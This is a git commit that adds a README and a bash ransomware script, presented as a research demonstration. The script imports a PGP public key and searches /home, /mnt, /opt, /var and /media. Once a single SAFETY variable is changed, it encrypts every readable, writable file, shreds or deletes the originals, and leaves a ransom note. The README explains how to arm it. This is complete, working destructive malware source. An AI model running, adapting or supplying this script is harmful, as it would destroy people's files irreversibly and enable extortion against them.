104abbebebfd8f32c422596bd1059d1dfbaab452
Lucas V. Araujo <lucas.vieira.ar@disroot.org>
2021-12-30 15:08:46 -0300

    first commit

---
+++ README.md
@@ -0,0 +1,8 @@
+#Ransomware in bash
+
+> For research purposes only
+
+This is a ransomware written in bash script, using Gnu Privacy Guard to encrypt files under a public key. The intention is just to demonstrate how easy it is to develop this kind of malicious program, even using something as simple as bash script (although the complicated part is left to GPG).
+
+I will not be responsible for any damage or misuse of this script, so please only run it on systems that you own or that you have permission to. To test this, edit the script and change the value of the SAFETY variable and then run the script. If you accidentaly encrypt your files, the private key is also present on this repository.
+
---
+++ ransomware.sh
@@ -0,0 +1,67 @@
+#!/bin/bash
+
+cat <<EOF | gpg --import >/dev/null 2>&1 
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+
+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
+=mqWi
+-----END PGP PUBLIC KEY BLOCK-----
+EOF
+
+SAFETY=1
+
+for path in "/home" "/mnt" "/opt" "/var" "/media"; do
+    find "$path/" -type f -readable -writable 2>/dev/null | while read filename; do
+        ext="${filename##*.}";
+        if [ "$ext" == "gpg" ]; then
+            continue;
+        fi;
+
+        if [ "$SAFETY" == "1" ]; then
+            echo "Encrypting $filename";
+        else
+            gpg --trust-model always -r badguy --encrypt "$filename";
+            shred -fuz "$filename" || rm -rf "$filename";
+        fi;
+    done;
+done;
+
+cat <<EOF > ~/random_note.txt
+Your files have been encrypted by an evil person blah blah blah.
+EOF
